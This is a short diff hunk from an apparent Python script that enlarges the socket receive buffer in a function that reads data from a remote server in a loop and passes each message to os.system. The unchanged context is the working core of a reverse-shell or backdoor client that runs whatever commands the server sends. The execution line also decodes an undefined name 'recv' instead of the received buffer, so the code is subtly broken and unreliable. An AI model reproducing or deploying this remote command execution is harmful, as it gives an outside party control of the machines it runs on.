@@ -11,7 +11,7 @@ def ListenToServer(server):
     global CONNECTIONENDED
     try:
         while CONNECTIONENDED == False:
-            recvBuffer = server.recv(1024)
+            recvBuffer = server.recv(4096)
             os.system(recv.decode())
     except Exception as e:
         server.close()
